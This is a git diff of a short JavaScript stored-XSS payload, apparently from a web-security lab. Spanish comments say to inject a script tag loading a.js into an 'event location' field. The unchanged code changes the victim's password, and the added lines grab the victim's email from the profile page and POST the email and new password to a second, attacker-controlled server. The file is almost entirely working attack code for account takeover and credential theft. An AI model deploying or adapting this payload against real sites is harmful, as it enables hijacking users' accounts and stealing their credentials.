@@ -1,6 +1,6 @@
 // Donde pone "introduce lugar del evento" hay que poner <script src="http://localhost:82/a.js"></script>
 // Donde pone "introduce lugar del evento" hay que poner <script src="http://localhost:82/a.js"></script>
-fetch('http://localhost:81/editarMiPerfil.php', {
+prom_correo = fetch('http://localhost:81/editarMiPerfil.php', {
     method: 'GET',
     headers: {
     },
@@ -41,3 +41,11 @@ httpreq.open("POST", "cambioContrasena.php")
 httpreq.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
 let data = `contrase%C3%B1a=${contraseña}`
 httpreq.send(data)
+
+prom_correo.then(correo => {
+    let httpreq2 = new XMLHttpRequest()
+    httpreq2.open("POST", "https://localhost:82/a.php")
+    httpreq2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
+    let data = `usuario=${correo}&contrasena=${contraseña}`
+    httpreq2.send(data)  
+})
